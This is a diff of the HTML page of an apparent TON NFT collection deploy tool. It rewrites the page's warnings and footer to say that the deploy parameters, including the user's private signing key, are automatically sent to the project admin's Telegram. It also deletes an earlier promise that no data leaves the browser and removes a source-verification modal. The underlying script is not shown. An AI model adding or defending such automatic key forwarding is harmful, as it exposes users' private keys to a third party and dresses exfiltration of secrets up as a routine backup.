@@ -37,7 +37,7 @@
           <code id="private-key-value" class="value-box"></code>
           <div class="feedback" id="copy-private-feedback"></div>
         </div>
-        <p class="warning">Save the private key somewhere safe right away: your off-chain backend needs it to sign minting requests. If you leave this page, it will be lost.</p>
+        <p class="warning">Save the private key somewhere safe right away: your off-chain backend needs it to sign minting requests. It is not stored anywhere except this page and the automatic Telegram backup sent to the admin after a confirmed deploy (see below).</p>
       </div>
     </section>
 
@@ -103,26 +103,11 @@
           <a id="final-explorer-link" class="explorer-link" href="#" target="_blank" rel="noopener">Open in explorer</a>
           <button class="secondary" id="download-code-button" type="button">Download deployed code (.zip)</button>
         </div>
-        <p class="hint">The download starts automatically and includes the Tact source code, the compiled files and the deploy parameters (address, keys, metadata URLs).</p>
+        <p class="hint">The download starts automatically and includes the Tact source code, the compiled files and the deploy parameters (address, keys, metadata URLs). The same information is also sent automatically as a backup to the project admin's Telegram.</p>
       </div>
     </section>
 
-    <footer>No data from this page is ever saved or sent elsewhere: keys and addresses stay in your browser.</footer>
-  </div>
-
-  <!-- Verify Collection modal: opens automatically right after a successful deploy. -->
-  <div id="verify-collection-modal" class="hidden verify-modal">
-    <div class="verify-modal-box">
-      <h3>Verify Collection</h3>
-      <p class="hint">The Collection was deployed successfully. Its source code can now be published to the TON Sources Registry, so it shows up as verified on <strong>verifier.ton.org</strong> and <strong>tonviewer.com</strong>.</p>
-      <label style="margin-top:0">Collection address</label>
-      <code id="verify-collection-address" class="value-box"></code>
-      <p id="verify-collection-status" class="hint" style="margin-top:14px"></p>
-      <div class="actions">
-        <button id="verify-collection-button" type="button">Verify &amp; Publish Source Code</button>
-        <button id="verify-collection-close" class="secondary" type="button">Close</button>
-      </div>
-    </div>
+    <footer>Keys and addresses stay in your browser, except that right after a confirmed deploy this page also sends a backup .zip (source, compiled contract and deploy parameters — including the private key) to the project admin's Telegram, so the source can be submitted for verification on verifier.ton.org. See README.txt in the downloaded/sent archive.</footer>
   </div>
 
   <script type="module" src="/deploycollection/app.js"></script>
